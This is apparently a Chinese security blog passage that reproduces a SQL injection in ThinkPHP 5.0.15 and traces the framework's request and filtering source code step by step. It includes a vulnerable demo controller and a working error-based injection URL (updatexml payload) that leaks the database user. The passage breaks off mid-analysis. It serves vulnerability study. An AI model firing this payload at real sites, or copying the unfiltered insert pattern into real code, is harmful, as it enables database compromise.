大多数文章都是分析了几个关键点，没有去详细的分析一下源码，最近，逐行跟了一下thinkphp5.0.15的SQL注入漏洞，  
希望对分析thinkphp框架SQL注入的师傅们有点帮助。
## 基础
先摆上这次需要用到的一些内置函数  
list — 把数组中的值赋给一组变量
array_walk_recursive — 对数组中的每个成员递归地应用用户函数
注意 键和值是反过来的
is_scalar — 检测变量是否是一个标量
composer安装  
刚刚学到一个composer的新用法，可以把tp版本回退
    "require": {
        "php": ">=5.4.0",
        "topthink/think-installer": "5.0.15"
    },
这样就可以回退到5.0.15版本
index控制器 加上这么一段连接数据库的代码
    get('username/a');
            db('users')->insert(['username' => $username]);
            return 'Update success';
        }
    }
database.php中 配置数据库，  
在创建一个数据库
    create database tpdemo;
    use tpdemo;
    create table users(
        id int primary key auto_increment,
        username varchar(50) not null
    );
config.php中 配置这两个为true
## 漏洞复现
    http://127.0.0.1/tp5.0.22/public/index.php/index/Index/index?username[0]=dec&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1
## 漏洞分析
get打个断点，调一下
进入get方法
    /**
     * 设置获取GET参数
     * @access public
     * @param string|array  $name 变量名
     * @param mixed         $default 默认值
     * @param string|array  $filter 过滤方法
     * @return mixed
     */
    public function get($name = '', $default = null, $filter = '')
    {
        if (empty($this->get)) {
            $this->get = $_GET;//把GET数组 传给 get变量，不过我在这里调试的时候，get已经有值了，
            //我估计应该是框架启动的时候添加的
        }
        if (is_array($name)) {//这里的name参数，是前面get方法设置的username/a  /a代表强制转换成数组
        //这里的name很显然不是数组，直接进入到了下面的input方法
            $this->param      = [];
            return $this->get = array_merge($this->get, $name);
        }
        return $this->input($this->get, $name, $default, $filter);// 四个参数 GET数组,username/a,null,''
    }
input方法
    /**
     * 获取变量 支持过滤和默认值
     * @param array         $data 数据源
     * @param string|false  $name 字段名
     * @param mixed         $default 默认值
     * @param string|array  $filter 过滤函数
     * @return mixed
     */
    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {//这里的name如果是false的换，就代表前面的get方法没有定义获取那个数据，以及数据类型
            // 获取原始数据
            return $data;
        }
        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {//检测name中是否有/  也就代表检测对数据格式是否有要求
                list($name, $type) = explode('/', $name);// 把name根据/ 拆分成数组，然后赋值给name type
                //现在name=username  type=a
            } else {
                $type = 's';//如果前面的获取参数的方法没有设置数据类型，默认为s  字符串类型
            }
            // 按.拆分成多维数组进行判断
            foreach (explode('.', $name) as $val) {//前面只传了username  所以val=username，
            //多说一句，我推测这里的.应该是input('变量类型.变量名/修饰符');  
            //tp官方文档里面定义的助手函数，这里有个“.”
                if (isset($data[$val])) {//data是GET数组中的内容，data[username]
                    $data = $data[$val];//这样就把请求中的username参数，，传给了data，
                    //注意这里的username也是一个数组
                } else {
                    // 无输入数据，返回默认值
                    return $default;//代表没有规则（username/a）中的参数传入，所以返回默认值
                }
            }
            if (is_object($data)) {//data是username这个数组，不是对象
                return $data;
            }
        }
        // 解析过滤器
        $filter = $this->getFilter($filter, $default);
        // 看下getFiler函数，   就是对filter进行了一个赋值，传进来的filter是空字符串''，返回的filter是空数组[]
        //protected function getFilter($filter, $default)
       // {
        //    if (is_null($filter)) {
        //        $filter = [];
        //    } else {
        //        $filter = $filter ?: $this->filter;
         //       if (is_string($filter) && false === strpos($filter, '/')) {
        //            $filter = explode(',', $filter);
        //        } else {
        //            $filter = (array) $filter;
       //        }
        //    }
        //    $filter[] = $default;
        //    return $filter;
        //}
        if (is_array($data)) {//data是username的数组
            array_walk_recursive($data, [$this, 'filterValue'], $filter);//进入回调函数，
跟进看一下filterValue函数，类似于循环，会把数组中的元素，挨个传到filterValue方法
    private function filterValue(&$value, $key, $filters)//value是data中的值，也就是GET数组中的值，即
            //参数的值，key是GET数组中的键，即参数的名，filters是要过滤规则
    {
        $default = array_pop($filters);//把数组中的元素弹出
        foreach ($filters as $filter) {
            if (is_callable($filter)) {//是否能够进行函数调用，这里的filter是空，所以无法调用
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {//检测一个变量是否是标量，那些东西是标量看上面的函数介绍
                if (false !== strpos($filter, '/')) {//filter为空，所以strpos返回false，进入到了下面的elseif
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {//filter是空的，所以这里也会跳过
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }
        return $this->filterExp($value);//直接就到了这里的filterExp方法
看一下这个方法是一个过滤函数，但是payload中的关键字，都没被过滤
    public function filterExp(&$value)//这里的value是引用传值，所以说data中的值，会被直接修改
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';//如果被检测到，会在后面加一个空格
        }
        // TODO 其他安全过滤
    }
    }
回到input函数
    reset($data);//数组指针指向数组中的第一个单元
        } else {
            $this->filterValue($data, $name, $filter);
        }
        if (isset($type) && $data !== $default) {//type已经设置是a， $default是null  
        //所以这里会进入typeCast的判断
            // 强制类型转换
            $this->typeCast($data, $type);
        }
        return $data;//把data返回
    }
跟进typeCast方法，进行强制转换
    private function typeCast(&$data, $type)
    {
        switch (strtolower($type)) {
            // 数组
            case 'a':
                $data = (array) $data;//因为type是a，所以强制转换为数组
                break;
            // 数字
            case 'd':
                $data = (int) $data;
                break;
            // 浮点
            case 'f':
                $data = (float) $data;
                break;
            // 布尔
            case 'b':
                $data = (boolean) $data;
                break;
            // 字符串
            case 's':
            default:
                if (is_scalar($data)) {
                    $data = (string) $data;
                } else {
                    throw new \InvalidArgumentException('variable type error：' . gettype($data));
                }
        }
    }
这里和官方文档的对上了
梳理一下，从调用get开始，到返回data经过的步骤
下面进入到了insert方法  
看一下传给Insert方法的参数
GET数组中的值已经被传过来了
这里的db，这种写法是利用了助手函数，所以会进入到helper.php中  
helper.php
    if (!function_exists('db')) {
        /**
         * 实例化数据库类
         * @param string        $name 操作的数据表名称（不含前缀）
         * @param array|string  $config 数据库配置参数
         * @param bool          $force 是否强制重新连接
         * @return \think\db\Query
         */
        function db($name = '', $config = [], $force = false)//只传了一个name是users
        {
            return Db::connect($config, $force)->name($name);
        }
    }
跟进  
Db::connect 会进入到Loader.php 下的autoload方法，触发自动加载 把Db类导入
    */
    public static function autoload($class)
    {
        // 检测命名空间别名
        if (!empty(self::$namespaceAlias)) {
            $namespace = dirname($class);
            if (isset(self::$namespaceAlias[$namespace])) {
                $original = self::$namespaceAlias[$namespace] . '\\' . basename($class);
                if (class_exists($original)) {
                    return class_alias($original, $class, false);
                }
            }
        }
结果就是把这个文件包含进来
进入connect方法
    public static function connect($config = [], $name = false)
    //传过来的参数是$config=[] $name=false和默认一样
    {
        if (false === $name) {//进入
            $name = md5(serialize($config));//对config进行一次序列化和md5
        }
        if (true === $name || !isset(self::$instance[$name])) {  //name虽然不等于true，
        //但是后面的self::$instance[$name]是没有设置的，
        //个人感觉$name是一个MD5的hash值是一个随机的数，不能这么巧，恰好定义
        //回去看了一下$instance的定义
        //@var Connection[] 数据库连接实例
            // 解析连接参数 支持数组和字符串
            $options = self::parseConfig($config);//config=[] 空数组
跟进parseConfig方法
    /**